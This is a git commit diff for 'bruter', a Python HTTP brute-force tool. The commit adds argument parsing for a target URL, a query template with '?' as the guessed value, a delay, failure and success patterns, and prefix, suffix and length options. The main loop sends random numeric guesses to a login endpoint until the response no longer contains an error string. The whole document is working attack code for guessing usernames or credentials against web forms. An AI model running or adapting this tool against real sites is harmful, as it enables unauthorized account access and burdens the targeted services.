c10c8e19f73af11d370c38db37ca3ad2657e3201
Ayman Al-Qadhi <aymanqadi2012@gmail.com>
2018-06-29 14:01:15 +0300

    Add command line parameters

--- main.py
+++ main.py
@@ -1,37 +1,39 @@
-from argparse import ArgumentParser
 from bruter.sources.random_nums import RandomNumbersSource
-from net.http import HttpManager
 from time import sleep, time, strftime, localtime
 from termcolor import colored
 from sys import stdout
+from utils.args import args, fpatt, spatt, url, data, delay, http
 
-parser = ArgumentParser()
-parser.parse_args()
+print ('\n\t--<( Attack Started on: %s )>--\n' % colored(strftime("%H:%M:%S"), 'yellow', attrs=['bold']))
+print (colored(' * ', 'green') + 'Url: %s' % colored(url, 'cyan', attrs=['bold']))
+print (colored(' * ', 'green') + 'Query: %s' % colored('username=?', 'cyan', attrs=['bold']))
+print (colored(' * ', 'green') + 'Attack Method: %s' % colored('Bruteforce (Random Numbers)', 'cyan', attrs=['bold']))
 
-print '\n\t--<( Attack Started on: %s )>--\n' % colored(strftime("%H:%M:%S"), 'yellow', attrs=['bold'])
-print ' * Url: %s' % colored('http://a.com/login', 'cyan', attrs=['bold'])
-print ' * Query: %s' % colored('username=?&password=123', 'cyan', attrs=['bold'])
-print ' * Attack Method: %s' % colored('Bruteforce (Random Numbers)', 'cyan', attrs=['bold'])
+print ('')
 
-print 
-
-src = RandomNumbersSource(6, 29)
+src = RandomNumbersSource(args.length)
 start_time = time()
 tries = 0
 
 while True:
-    v = src.Next()
+    v = args.prefix + str(src.Next()) + args.suffix
     tries += 1
 
-    stdout.write('\r\t Current Entry [ %s ] Try #%d, %s Elapsed' % (colored(str(v), 'cyan', attrs=['bold']), tries, colored('%ds' % (time() - start_time), 'yellow')))
+    stdout.write('\r\t Current Entry [ %s ] Try #%s, %s Elapsed' % (colored(str(v), 'cyan', attrs=['bold']), colored(tries, 'yellow'), colored('%ds' % (time() - start_time), 'yellow')))
     stdout.flush()
 
-    if(str(v).startswith('2999')):
-        print '\n\n\t   ' + '-' * 40
-        print '\n\t\t   --<( %s )>--' % colored('Match Found!', 'yellow', attrs=['bold'])
-        print '\n\t\t     * Value: %s' % colored(str(v), 'cyan', attrs=['bold'])
-        print '\t\t     * Total Tries: %s\n' % colored(str(tries), 'yellow', attrs=['bold'])
+    ret = ''
+    if args.post:
+        ret = http.make_request(url, data=data)
+    else:
+        ret = http.make_request(url + '?' + data.replace('?', str(v)))
+
+    if 'var error' not in ret: #not fpatt.match(ret) or spatt.match(ret):
+        print ('\n\n\t   ' + '-' * 40)
+        print ('\n\t\t   --<( %s )>--' % colored('Match Found!', 'green', attrs=['bold']))
+        print ('\n\t\t     * Value: %s' % colored(' ' + str(v) + ' ', 'cyan', attrs=['bold', 'reverse']))
+        print ('\t\t     * Total Tries: %s\n' % colored(str(tries), 'yellow', attrs=['bold']))
         break
 
-    sleep(0.01)
-    
+    sleep(delay / 1000)
+
---
+++ utils/args.py
@@ -0,0 +1,45 @@
+import http
+
+import argparse
+import re
+
+def valid_url(s, pat = re.compile(r'^((http|https|ftp)\://)([a-zA-Z0-9\.\-]+(\:[a-zA-Z0-9\.&amp;%\$\-]+)*@)*((25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[1-9])\.(25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[1-9]|0)\.(25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[1-9]|0)\.(25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[0-9])|localhost|([a-zA-Z0-9\-]+\.)*[a-zA-Z0-9\-]+\.(com|edu|gov|int|mil|net|org|biz|arpa|info|name|pro|aero|coop|museum|[a-zA-Z]{2}))(\:[0-9]+)*(/($|[a-zA-Z0-9\.\,\?\'\\\+&amp;%\$#\=~_\-]+))*$')):
+    if not pat.match(s):
+        raise argparse.ArgumentTypeError
+    return s
+
+parser = argparse.ArgumentParser(description='Starts an http/https attack using bruteforce/dictionary-based methods.', version='1.0 BETA')
+
+parser.add_argument('url', help='url to start attack on', type=valid_url)
+parser.add_argument('-d', '--data', help='The data to try on, ? for the unknown parameter')
+parser.add_argument('--delay', help='The data to try on, ? for the unknown parameter', default=0, type=int)
+parser.add_argument('-f', '--fpattern', help='A Pattern to check each response on and continue if it matches', default=r'var error')
+parser.add_argument('-s', '--spattern', help='A Pattern to check each response on and continue if it does not matches', default='')
+
+parser.add_argument('--post', help='Use HTTP POST requests')
+parser.add_argument('--get', help='Use HTTP GET requests')
+
+parser.add_argument('--prefix', help='A suffix to add after the parameter value', default='')
+parser.add_argument('--suffix', help='A prefix to add before the parameter value', default='')
+parser.add_argument('--length', type=int, help='The length of the randomly generated value', default=6)
+
+args = parser.parse_args()
+
+url = args.url
+if str(url).endswith('/'):
+    url = url[:-1]
+
+delay = args.delay
+data = args.data
+
+if not data:
+    data  = 'username=?'
+elif str(data).find('?') == -1:
+    if str(data).endswith('?'):
+        data += '&'
+    data += 'username=?'
+
+fpatt = re.compile(args.fpattern)
+spatt = re.compile(args.spattern)
+
+http = http.HttpManager()
